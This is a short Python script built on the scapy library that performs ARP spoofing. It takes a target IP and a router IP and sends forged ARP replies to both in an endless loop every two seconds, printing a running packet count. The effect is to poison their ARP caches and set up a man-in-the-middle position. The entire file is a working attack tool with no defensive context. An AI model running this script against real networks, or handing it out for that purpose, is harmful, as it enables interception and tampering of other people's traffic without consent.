#!/usr/bin/env python

import scapy.all as scapy
import argparse
import time
import sys

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP address")
    parser.add_argument("-s", "--spoof", dest="spoof", help="Spoof IP address (router address)")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target IP address")
    elif not options.spoof:
        parser.error("[-] Please specify a spoof IP address")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target, spoof):
    target_mac = get_mac(target)
    packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof)
    # to list all the parameters : scapy.ls(scapy.ARP)
    scapy.send(packet, verbose=False)

options = get_arguments()
sent_packets = 0
while True:
    spoof(options.target, options.spoof)
    spoof(options.spoof,options.target)
    sent_packets += 2
    print("\r[+] Packets sent: " + str(sent_packets)),
    sys.stdout.flush()
    time.sleep(2)
